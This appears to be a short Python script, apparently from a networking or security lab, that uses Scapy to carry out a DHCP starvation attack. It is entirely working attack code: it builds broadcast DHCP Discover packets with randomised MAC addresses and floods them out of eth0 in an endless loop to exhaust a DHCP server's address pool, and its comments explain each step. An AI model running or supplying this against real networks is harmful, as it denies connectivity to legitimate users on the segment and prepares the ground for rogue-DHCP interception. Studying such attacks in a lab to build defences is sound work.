# DHCP Starvation:
# Import Scapy
from scapy.all import *
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf

# conf.checkIPaddr must be False
conf.checkIPaddr = False

# Create DHCP discovery with dstIP = broadcast addr
# srcMACaddr = random MAC addr
# srcIPaddr = 0.0.0.0
# dstIPaddr = broadcast
# srcPort = 68 (DHCP / BOOTP client)
# dstPort = 67 (DHCP / BOOTP Server)
# DHCP msg type = discover
# ff:ff:ff:ff:ff:ff = broadcast MAC addr
# To fake all DHCP clients
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) /IP(src='0.0.0.0', dst='255.255.255.255') /UDP(sport=68, dport=67) /BOOTP(op=1, chaddr=RandMAC()) /DHCP(options=[('message-type','discover'),('end')])
                    
# Send packet out of eth0 & loop the packet
sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)